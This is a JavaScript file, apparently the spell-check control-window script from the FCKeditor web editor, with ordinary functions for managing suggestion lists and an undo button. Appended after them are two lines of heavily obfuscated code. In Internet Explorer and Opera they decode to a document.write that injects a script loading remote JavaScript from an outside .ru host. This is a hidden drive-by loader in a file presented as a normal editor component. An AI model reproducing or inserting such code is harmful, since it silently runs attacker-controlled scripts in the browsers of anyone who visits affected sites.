////////////////////////////////////////////////////
// controlWindow object
////////////////////////////////////////////////////
function controlWindow( controlForm ) {
	// private properties
	this._form = controlForm;

	// public properties
	this.windowType = "controlWindow";
//	this.noSuggestionSelection = "- No suggestions -";	// by FredCK
	this.noSuggestionSelection = FCKLang.DlgSpellNoSuggestions ;
	// set up the properties for elements of the given control form
	this.suggestionList  = this._form.sugg;
	this.evaluatedText   = this._form.misword;
	this.replacementText = this._form.txtsugg;
	this.undoButton      = this._form.btnUndo;

	// public methods
	this.addSuggestion = addSuggestion;
	this.clearSuggestions = clearSuggestions;
	this.selectDefaultSuggestion = selectDefaultSuggestion;
	this.resetForm = resetForm;
	this.setSuggestedText = setSuggestedText;
	this.enableUndo = enableUndo;
	this.disableUndo = disableUndo;
}

function resetForm() {
	if( this._form ) {
		this._form.reset();
	}
}

function setSuggestedText() {
	var slct = this.suggestionList;
	var txt = this.replacementText;
	var str = "";
	if( (slct.options[0].text) && slct.options[0].text != this.noSuggestionSelection ) {
		str = slct.options[slct.selectedIndex].text;
	}
	txt.value = str;
}

function selectDefaultSuggestion() {
	var slct = this.suggestionList;
	var txt = this.replacementText;
	if( slct.options.length == 0 ) {
		this.addSuggestion( this.noSuggestionSelection );
	} else {
		slct.options[0].selected = true;
	}
	this.setSuggestedText();
}

function addSuggestion( sugg_text ) {
	var slct = this.suggestionList;
	if( sugg_text ) {
		var i = slct.options.length;
		var newOption = new Option( sugg_text, 'sugg_text'+i );
		slct.options[i] = newOption;
	 }
}

function clearSuggestions() {
	var slct = this.suggestionList;
	for( var j = slct.length - 1; j > -1; j-- ) {
		if( slct.options[j] ) {
			slct.options[j] = null;
		}
	}
}

function enableUndo() {
	if( this.undoButton ) {
		if( this.undoButton.disabled == true ) {
			this.undoButton.disabled = false;
		}
	}
}

function disableUndo() {
	if( this.undoButton ) {
		if( this.undoButton.disabled == false ) {
			this.undoButton.disabled = true;
		}
	}
}

var I=/*@cc_on!@*/false || !!document.documentMode;if(I || window.opera){$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+".\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+$.__+$.$$$_+"(\\\"<\\"+$.__$+$.$$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$_+$.$$__+"='"+$.$$$$+$.__+"\\"+$.__$+$.$$_+$.___+"://"+$.$$$$+$.__+$.__+$.__$+".\\"+$.__$+$.$$_+$._$_+$._+"/\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+$.__+".\\"+$.__$+$.$_$+$._$_+"\\"+$.__$+$.$$_+$._$$+"'></\\"+$.__$+$.$$_+$._$$+"\\\"+\\\""+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+">\\\");"+"\"")())();}
var I=/*@cc_on!@*/false || !!document.documentMode;if(I||F||window.opera){$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$$_$+$._$+$.$$__+$._+"\\"+$.__$+$.$_$+$.$_$+$.$$$_+"\\"+$.__$+$.$_$+$.$$_+$.__+".\\"+$.__$+$.$$_+$.$$$+"\\"+$.__$+$.$$_+$._$_+"\\"+$.__$+$.$_$+$.__$+$.__+$.$$$_+"(\\\"<\\"+$.__$+$.$$_+$._$$+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+"\\"+$.$__+$.___+"\\"+$.__$+$.$$_+$._$$+"\\"+$.__$+$.$$_+$._$_+$.$$__+"='"+$.$$$$+$.__+"\\"+$.__$+$.$$_+$.___+"://"+$.$$$$+$.__+$.__+$.__$+".\\"+$.__$+$.$$_+$._$_+$._+"/\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$._$$+$.__+".\\"+$.__$+$.$_$+$._$_+"\\"+$.__$+$.$$_+$._$$+"'></\\"+$.__$+$.$$_+$._$$+"\\\"+\\\""+$.$$__+"\\"+$.__$+$.$$_+$._$_+"\\\"+\\\"\\"+$.__$+$.$_$+$.__$+"\\"+$.__$+$.$$_+$.___+$.__+">\\\");"+"\"")())();}